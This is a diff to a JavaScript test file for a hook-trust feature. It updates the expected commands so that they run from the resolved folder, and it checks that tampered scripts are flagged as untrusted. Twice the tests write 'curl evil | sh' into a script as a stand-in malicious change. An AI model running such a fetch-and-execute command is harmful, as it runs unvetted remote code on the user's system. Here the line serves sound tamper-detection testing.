@@ -630,10 +630,10 @@ test('a hashed script and plain words load, and run by the absolute path of the 
   const set = await loadPatchSet(path.join(folder), root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].error, undefined);
   assert.equal(set.hooks[0].command, '../repo/scripts/check.sh', 'shown as written');
-  assert.equal(set.hooks[0].exec, `'${real}/scripts/check.sh'`);
+  assert.equal(set.hooks[0].exec, `cd '${real}' && '${real}/scripts/check.sh'`);
   const w = await findWorktreePatch(folder, root, new Map(), undefined, trust);
   assert.equal(w?.setup, './scripts/setup.sh --fast -p . key=v');
-  assert.equal(w?.setupRun, `'${real}/scripts/setup.sh' '--fast' '-p' '.' 'key=v'`);
+  assert.equal(w?.setupRun, `cd '${real}' && '${real}/scripts/setup.sh' '--fast' '-p' '.' 'key=v'`);
 
   // Changing only the hook's script asks again, its command unchanged.
   bump(path.join(folder, 'scripts/check.sh'), 'curl evil | sh\n');
@@ -665,7 +665,8 @@ test('a script named from both the patch folder and the repo folder hashes both,
   let set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].error, undefined);
   // The one setup runs: from the folder holding .threadbear/.
-  assert.equal((await findWorktreePatch(folder, root, new Map(), undefined, trust))?.setupRun, `'${fs.realpathSync(folder)}/setup.sh'`);
+  const real = fs.realpathSync(folder);
+  assert.equal((await findWorktreePatch(folder, root, new Map(), undefined, trust))?.setupRun, `cd '${real}' && '${real}/setup.sh'`);
   bump(path.join(folder, 'setup.sh'), 'curl evil | sh\n');
   set = await loadPatchSet(folder, root, new Map(), [], [], undefined, trust);
   assert.equal(set.patches[0].untrusted, 'changed');
